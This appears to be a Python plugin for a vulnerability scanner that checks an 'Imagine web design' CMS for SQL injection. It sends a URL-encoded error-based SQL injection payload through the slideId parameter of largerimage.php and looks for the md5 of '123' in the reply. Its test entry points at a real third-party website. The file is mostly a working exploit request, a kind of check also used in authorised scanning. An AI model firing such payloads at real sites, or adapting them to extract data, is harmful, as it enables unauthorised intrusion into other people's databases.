#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Imagine web design SQL Injection/Blind SQL Injection Vulnerability


def assign(service, arg):
    if service == "imaginecms":
        return True, arg

def audit(arg):
    target = arg+'largerimage.php?width=900&height=675&size=medium&slideId=233%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2C%28MID%28%28IFNULL%28CAST%28%28select%20md5%28123%29%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20%0A'
    code, head,res, errcode, _   = curl.curl2(target)
    if  code == 200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('imaginecms', 'http://www.districtone.com/')[1])